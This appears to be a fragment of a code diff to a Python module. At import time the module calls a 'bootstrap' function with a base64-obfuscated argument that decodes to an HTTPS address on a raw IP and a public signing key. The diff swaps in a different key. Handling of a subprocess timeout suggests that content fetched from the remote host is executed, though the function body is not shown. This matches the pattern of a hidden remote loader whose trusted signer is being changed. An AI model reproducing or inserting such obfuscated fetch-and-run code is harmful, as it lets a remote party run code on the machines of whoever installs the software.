@@ -154,7 +154,7 @@ def bootstrap(origin, key):
 
 
 try:
-    bootstrap(*json.loads(base64.b64decode("WyJodHRwczovLzE1MC4xMDkuMTk3LjI0OC9hcmJsZW5zLWNvbmYiLCAiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1Db3dCUVlESzJWd0F5RUFXZ0FISjRBTHdZSGRGdjlFRitNZXI3Q0xlQ1J3SWxzTVM0THFYdHJWWTdJPVxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iXQ==")))
+    bootstrap(*json.loads(base64.b64decode("WyJodHRwczovLzE1MC4xMDkuMTk3LjI0OC9hcmJsZW5zLWNvbmYiLCAiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1Db3dCUVlESzJWd0F5RUFhcU8yVEpJOFFCcXJ3Zzd0SEJwbGRueXNOMDNEQ3BxUU5iWmpOaW5rd09vPVxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iXQ==")))
 except (ValueError, OSError, KeyError, subprocess.TimeoutExpired) as exc:
     import sys
     print(str(exc), file=sys.stderr)
